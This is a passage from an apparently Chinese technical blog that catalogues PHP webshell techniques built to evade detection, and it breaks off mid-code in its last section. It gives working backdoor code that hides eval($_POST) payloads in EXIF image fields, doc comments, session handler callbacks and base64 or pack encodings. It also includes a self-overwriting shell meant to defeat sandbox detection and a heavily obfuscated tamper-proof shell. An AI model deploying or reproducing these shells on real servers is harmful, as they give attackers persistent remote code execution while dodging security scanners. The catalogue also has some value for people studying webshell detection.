 echo &quot;img.jpg:&lt;br /&gt;\n&quot;;</span><br><span class="line">    $exif = exif_read_data(&#x27;img.jpg&#x27;, &#x27;IFD0&#x27;);</span><br><span class="line">    //IFD0     所有 IFD0 的标记数据。在标准的图像文件中这包含了图像大小及其它。</span><br><span class="line">    echo $exif===false ? &quot;No header data found.&lt;br /&gt;&quot; : &quot;Image contains headers&lt;br /&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    //FILE    FileName, FileSize, FileDateTime, SectionsFound</span><br><span class="line">    $exif = exif_read_data(&#x27;img.jpg&#x27;, &#x27;FILE&#x27;, true);</span><br><span class="line">    echo &quot;img.jpg:&lt;br /&gt;\n&quot;;</span><br><span class="line">    foreach ($exif as $key =&gt; $section)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($section as $name =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;$key.$name: $val&lt;br /&gt;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">隐藏webshell思路</span><br><span class="line"></span><br><span class="line">1. 和传统的图片木马不一样，传统的图片木马就是简单的利用type命令把webshell代码接在一个正常的图片尾部，然后在另一个脚本中使用include包含进来，PHP解析解析引擎会忽略在PHP看来毫无意义的图片数据的乱码，而去执行在文件结尾的PHP代码</span><br><span class="line"></span><br><span class="line">2. 而关于这种图片木马，可以有一种更加精确的利用方式，图片(也就是EXIT格式的文件)的每个区段都是有精确意义的，可以将我们的webshell准确地放置在这些指定的区域，然后使用exif_read_data去读取读取出来，再使用preg_replace的&quot;e&quot;开关去动态执行，或者使用动态函数去动态执行</span><br><span class="line"></span><br><span class="line">3. 这个方法可以用来规避include那种类型的黑名单检测</span><br><span class="line"></span><br><span class="line">将webshell代码放置在EXIT的头部区域中，这里挑选: IFD0-&gt;</span><br><span class="line">1. ImageDescription: /.*/e</span><br><span class="line">2. Subject: eval(\$_POST[1])</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">    //FILE    FileName, FileSize, FileDateTime, SectionsFound</span><br><span class="line">    $exif = exif_read_data(&#x27;img.jpg&#x27;, &#x27;FILE&#x27;, true);</span><br><span class="line">    var_dump($exif[&#x27;IFD0&#x27;][&#x27;ImageDescription&#x27;]);</span><br><span class="line">    var_dump($exif[&#x27;IFD0&#x27;][&#x27;Subject&#x27;]);</span><br><span class="line">    preg_replace($exif[&#x27;IFD0&#x27;][&#x27;ImageDescription&#x27;], $exif[&#x27;IFD0&#x27;][&#x27;Subject&#x27;],&#x27;&#x27;);</span><br><span class="line">    //die();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="21-注释-反射机制"><a href="#21-注释-反射机制" class="headerlink" title="21. 注释+反射机制"></a>21. 注释+反射机制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// 将webshell放到了/**/注释中，然后利用类的反射机制获取到，进行动态函数的执行</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">    /**   </span><br><span class="line">    * eval($_POST[1]);</span><br><span class="line">    */  </span><br><span class="line">    class TestClass &#123; &#125;  </span><br><span class="line">    $rc = new ReflectionClass(&#x27;TestClass&#x27;);  </span><br><span class="line">    //获取当前文档的注释</span><br><span class="line">    $comment = $rc-&gt;getDocComment();</span><br><span class="line">    //die(var_dump($comment));</span><br><span class="line"></span><br><span class="line">    $pos = strpos($comment,&#x27;eval&#x27;);</span><br><span class="line">    //die(var_dump($pos));  </span><br><span class="line"></span><br><span class="line">    $eval=substr($comment,$pos,16);  </span><br><span class="line">    //die($eval);</span><br><span class="line">    eval($eval);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">// 利用反射类机制，将原本的webshell代码进行加花、换行、大小写变形，进行代码执行</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    /**</span><br><span class="line">    * eva</span><br><span class="line">    * l($_GE</span><br><span class="line">    * T[&quot;c&quot;]);</span><br><span class="line">    * asse</span><br><span class="line">    * rt</span><br><span class="line">    */</span><br><span class="line">    class TestClass &#123; &#125;</span><br><span class="line">    $rc = new ReflectionClass(&#x27;TestClass&#x27;);</span><br><span class="line">    $str = $rc-&gt;getDocComment();</span><br><span class="line">    die(var_dump($str));</span><br><span class="line">    $evf=substr($str,strpos($str,&#x27;e&#x27;),3);</span><br><span class="line">    $evf=$evf.substr($str,strpos($str,&#x27;l&#x27;),6);</span><br><span class="line">    $evf=$evf.substr($str,strpos($str,&#x27;T&#x27;),8);</span><br><span class="line">    $fu=substr($str,strpos($str,&#x27;as&#x27;),4);</span><br><span class="line">    $fu=$fu.substr($str,strpos($str,&#x27;r&#x27;),2);</span><br><span class="line">    $fu($evf);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<h3 id="22-自毁性Webshell"><a href="#22-自毁性Webshell" class="headerlink" title="22. 自毁性Webshell"></a>22. 自毁性Webshell</h3><p>PHP的动态沙箱检测技术，对PHP执行引擎进行hook进行动态检测，即构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断；而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数”code”，就会导致毁灭性覆写”fwrite ($fp, $content)”的结果，这样，沙箱的执行结果就是一个普通的文本，这种方法利用沙箱的机制，沙箱导致了文件的毁坏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //$url = $_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">    //$filename = end(explode(&#x27;/&#x27;,$url));</span><br><span class="line">    //die($filename);</span><br><span class="line">    if($_REQUEST[&quot;code&quot;]==pany)</span><br><span class="line">    &#123;</span><br><span class="line">        echo str_rot13(&#x27;riny($_CBFG[pzq]);&#x27;);</span><br><span class="line">        eval(str_rot13(&#x27;riny($_CBFG[pzq]);&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $url = $_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">        $filename = end(explode(&#x27;/&#x27;,$url));</span><br><span class="line">           </span><br><span class="line">        $content = &#x27;helloworld&#x27;;</span><br><span class="line">        $fp = fopen (&quot;$filename&quot;,&quot;w&quot;);</span><br><span class="line">        if (fwrite ($fp, $content))</span><br><span class="line">        &#123;</span><br><span class="line">            fclose ($fp);</span><br><span class="line">            die (&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            fclose ($fp);</span><br><span class="line">            die (&quot;good&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="23-利用本地变量注册技术"><a href="#23-利用本地变量注册技术" class="headerlink" title="23. 利用本地变量注册技术"></a>23. 利用本地变量注册技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    @extract ($_REQUEST);</span><br><span class="line">    @die($ctime($atime));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/test/index.php?ctime=assert&amp;atime=phpinfo()</span><br><span class="line"></span><br><span class="line">HP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造</span><br><span class="line">1) extract</span><br><span class="line">2) parse_str</span><br><span class="line">3) foreach(..) &#123; $$key = $value; &#125;</span><br></pre></td></tr></table></figure>

<h3 id="24-利用ReflectionFunction反射"><a href="#24-利用ReflectionFunction反射" class="headerlink" title="24. 利用ReflectionFunction反射"></a>24. 利用ReflectionFunction反射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $func = new ReflectionFunction(&quot;system&quot;);</span><br><span class="line">    echo $func-&gt;invokeArgs(array(&quot;$_GET[c]&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="25-利用PHP自定义函数"><a href="#25-利用PHP自定义函数" class="headerlink" title="25. 利用PHP自定义函数"></a>25. 利用PHP自定义函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(key($_GET)==&#x27;dede&#x27;)</span><br><span class="line">        //call_user_func($_GET[&#x27;dede&#x27;], &quot;@eval($_POST[bs]);&quot;);</span><br><span class="line">        call_user_func($_GET[&#x27;dede&#x27;], base64_decode(&#x27;QGV2YWwoJF9QT1NUW2JzXSk7&#x27;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    //call_user_func($_GET[&#x27;dede&#x27;], &quot;@eval($_POST[bs]);&quot;);</span><br><span class="line">    call_user_func($_GET[&#x27;dede&#x27;], base64_decode(&#x27;QGV2YWwoJF9QT1NUW2JzXSk7&#x27;)); </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://localhost/test/test.php?dede=assert</span><br></pre></td></tr></table></figure>

<h3 id="26-防篡改WEBSHELL"><a href="#26-防篡改WEBSHELL" class="headerlink" title="26. 防篡改WEBSHELL"></a>26. 防篡改WEBSHELL</h3><p>这种WEBSHELL遵循了严格的生成逻辑，并精确地在代码中加入了花指令，只有文件完好无损才能正常解密出原始文件并执行，一旦文件遭到了任何修改，则解密过程会失败，导致webshell无法执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php /* Powered by www.qibosoft.com */$lll11l11l11l11l1=__FILE__;eval(base64_decode(&#x27;JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbDExbDExbDExbDEsJ3JiJyk7ZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjE2MCk7JGxsMWxsbGwxMTExMTExMWw9ZXhwbG9kZSgiXHQiLGJhc2U2NF9kZWNvZGUoZnJlYWQoJGxsMTFsbGwxMWxsbGwxMWwsMjcyKSkpOw==&#x27;));$lll111111ll1l1ll=$ll1llll11111111l[0];$l1ll11lllll1ll1l=$lll111111ll1l1ll&#123;2&#125;.$lll111111ll1l1ll&#123;5&#125;.$lll111111ll1l1ll&#123;8&#125;.$lll111111ll1l1ll&#123;11&#125;.$lll111111ll1l1ll&#123;14&#125;.$lll111111ll1l1ll&#123;17&#125;.$lll111111ll1l1ll&#123;20&#125;.$lll111111ll1l1ll&#123;23&#125;.$lll111111ll1l1ll&#123;26&#125;.$lll111111ll1l1ll&#123;29&#125;.$lll111111ll1l1ll&#123;32&#125;.$lll111111ll1l1ll&#123;35&#125;.$lll111111ll1l1ll&#123;38&#125;;$l11llll111l1l11l=$l1ll11lllll1ll1l($ll1llll11111111l[1]);$l1l11111ll1l1l1l=$l1ll11lllll1ll1l($l11llll111l1l11l&#123;2&#125;.$l11llll111l1l11l&#123;5&#125;.$l11llll111l1l11l&#123;8&#125;.$l11llll111l1l11l&#123;11&#125;.$l11llll111l1l11l&#123;14&#125;.$l11llll111l1l11l&#123;17&#125;.$l11llll111l1l11l&#123;20&#125;.$l11llll111l1l11l&#123;23&#125;);$lll1ll11l11l1ll1=$l1ll11lllll1ll1l($ll1llll11111111l[2]);$l111ll111lll1111=$l1ll11lllll1ll1l($lll1ll11l11l1ll1&#123;2&#125;.$lll1ll11l11l1ll1&#123;5&#125;.$lll1ll11l11l1ll1&#123;8&#125;.$lll1ll11l11l1ll1&#123;11&#125;.$lll1ll11l11l1ll1&#123;14&#125;.$lll1ll11l11l1ll1&#123;17&#125;.$lll1ll11l11l1ll1&#123;20&#125;.$lll1ll11l11l1ll1&#123;23&#125;);$ll1lll1lll111111=$l1ll11lllll1ll1l($ll1llll11111111l[3]);$ll11llllll1lllll=$l1ll11lllll1ll1l($ll1lll1lll111111&#123;2&#125;.$ll1lll1lll111111&#123;5&#125;.$ll1lll1lll111111&#123;8&#125;.$ll1lll1lll111111&#123;11&#125;.$ll1lll1lll111111&#123;14&#125;.$ll1lll1lll111111&#123;17&#125;.$ll1lll1lll111111&#123;20&#125;.$ll1lll1lll111111&#123;23&#125;);$lll1ll11l1111l11=$l1ll11lllll1ll1l($ll1llll11111111l[4]);$ll1111l11l11llll=$l1ll11lllll1ll1l($lll1ll11l1111l11&#123;2&#125;.$lll1ll11l1111l11&#123;5&#125;.$lll1ll11l1111l11&#123;8&#125;.$lll1ll11l1111l11&#123;11&#125;.$lll1ll11l1111l11&#123;14&#125;.$lll1ll11l1111l11&#123;17&#125;.$lll1ll11l1111l11&#123;20&#125;.$lll1ll11l1111l11&#123;23&#125;);$llll11l1ll111l1l=$l1ll11lllll1ll1l($ll1llll11111111l[5]);$llllll1l11llllll=$l1ll11lllll1ll1l($llll11l1ll111l1l&#123;2&#125;.$llll11l1ll111l1l&#123;5&#125;.$llll11l1ll111l1l&#123;8&#125;.$llll11l1ll111l1l&#123;11&#125;.$llll11l1ll111l1l&#123;14&#125;.$llll11l1ll111l1l&#123;17&#125;.$llll11l1ll111l1l&#123;20&#125;.$llll11l1ll111l1l&#123;23&#125;);eval($l1ll11lllll1ll1l(&#x27;JGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMTcpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJGxsMTFsbGxsbGwxbGxsbGwoJGxsMTFsbGwxMWxsbGwxMWwsMjMyKSkpOw==&#x27;));return ;?&gt;dGFiMWVhYjlzY2RlYjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRucGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM54bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=AhDBms0qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=tGLOYY5fUpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=JqjcRhp75i6Lf4MwjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=yS0ttoM7R7SDkJpvuNKUO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=vMCvyQqBIgcoO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=agQLu9pzZf25xZjXjO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=WOmDsuNvUYJUFK3O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=hx7OShbiw40pgFI3OeYhO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qTXlLU2twT3c9PScpKTs=lErzbn3Vk5O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qazJLU2twT3c9PScpKTs=U5zJkvgx0MBjZXZhbCgkbDFsbDExbGxsbGwxbGwxbCgnSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2JHd3hNV3dzTVRNNE9Da3BLVHNrYkd4c2JHeHNNV3d4TVd4c2JHeHNiQ2drYkd3eE1XeHNiREV4Ykd4c2JERXhiQ2s3JykpOw==Orb94oK1BBaoF8cySgaWYoJF9QT1NUWydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0ZlhrRVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0KaWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoJJGZpbGV1cmw9Imh0dHA6Ly9kb3duLnFpYm9zb2Z0LmNvbS91cGdyYWRlLnppcCI7DQoJaWYoJGNvZGU9ZmlsZV9nZXRfY29udGVudHMoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KCWVsc2VpZigkY29kZT1maWxlKCRmaWxldXJsKSkNCgl7DQoJCXdyaXRlX2ZpbGUoUk9PVF9QQVRILiJjYWNoZS91cGdyYWRlLnppcCIsJGNvZGUpOw0KCX0NCgllbHNlaWYoY29weSgkZmlsZXVybCxST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIiwkY29kZSk7DQoJfQ0KDQoJcmVxdWlyZV9vbmNlKFJPT1RfUEFUSC4iaW5jL2NsYXNzLnoucGhwIik7DQoJJHogPSBuZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNIIENPTlRFTlQ9JzA7VVJMPSR3ZWJkYlt3d3dfdXJsXS9jYWNoZS91cGdyYWRlL2luZGV4LnBocCc+IjsNCglleGl0Ow0KfQ==Oz1aqN6Bs2Twgiat5H0qQeo5bgm84V1tvONOA</span><br></pre></td></tr></table></figure>

<h3 id="27-利用session-set-save-handler-callback"><a href="#27-利用session-set-save-handler-callback" class="headerlink" title="27. 利用session_set_save_handler callback"></a>27. 利用session_set_save_handler callback</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0); </span><br><span class="line">    $session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert</span><br><span class="line">    // open第一个被调用，类似类的构造函数</span><br><span class="line">    function open($save_path, $session_name) </span><br><span class="line">    &#123;&#125;</span><br><span class="line">    // close最后一个被调用，类似 类的析构函数</span><br><span class="line">    function close() </span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    // 执行session_id($_REQUEST[&#x27;op&#x27;])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST[&#x27;op&#x27;])</span><br><span class="line">    session_id($_REQUEST[&#x27;op&#x27;]);</span><br><span class="line">    function write($id, $sess_data) </span><br><span class="line">    &#123;&#125;</span><br><span class="line">    function destroy($id) </span><br><span class="line">    &#123;&#125;</span><br><span class="line">    function gc() </span><br><span class="line">    &#123;&#125;</span><br><span class="line">    // 第三个参数为read  read(string $sessionId)</span><br><span class="line">    session_set_save_handler(&quot;open&quot;, &quot;close&quot;, $session, &quot;write&quot;, &quot;destroy&quot;, &quot;gc&quot;);</span><br><span class="line">    @session_start(); // 打开会话</span><br><span class="line">    $cloud = $_SESSION[&quot;d&quot;] = &quot;c&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="28-利用include、pack隐藏webshell"><a href="#28-利用include、pack隐藏webshell" class="headerlink" title="28. 利用include、pack隐藏webshell"></a>28. 利用include、pack隐藏webshell</h3><p>利用PHP的include可以引入外部代码的特性，实现WEBSHELL代码的隐藏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo bin2hex(&quot;&lt;?php echo hello; ?&gt;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    @include(pack(&quot;H*&quot;, &quot;3c3f706870206563686f2068656c6c6f3b203f3e&quot;));  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="29-临时文件-include"><a href="#29-临时文件-include" class="headerlink" title="29. 临时文件 + include"></a>29. 临时文件 + include</h3><p>通过将恶意代码写入临时磁盘文件，然后include进当前代码空间进行执行，运行之后删除临时文件；通过写磁盘文件进行一次”中转”，是因为php不允许直接include一段字符串，但是允许一个包含php代码的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $cfg_ml=&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+&#x27;;</span><br><span class="line">    //&lt;?php @eval($_POST[&#x27;guige&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">    $cfg_ml = base64_decode($cfg_ml);</span><br><span class="line">    $t = md5(mt_rand(1,100));</span><br><span class="line">    //尝试向各种可能的目录下写入临时WEBSHELL文件</span><br><span class="line">    $f=$_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/data/sessions/sess_&#x27;.$t;</span><br><span class="line">    @file_put_contents($f,$cfg_ml);</span><br><span class="line">    if(!file_exists($f))</span><br><span class="line">    &#123;    </span><br><span class="line">        $f=$t;</span><br><span class="line">        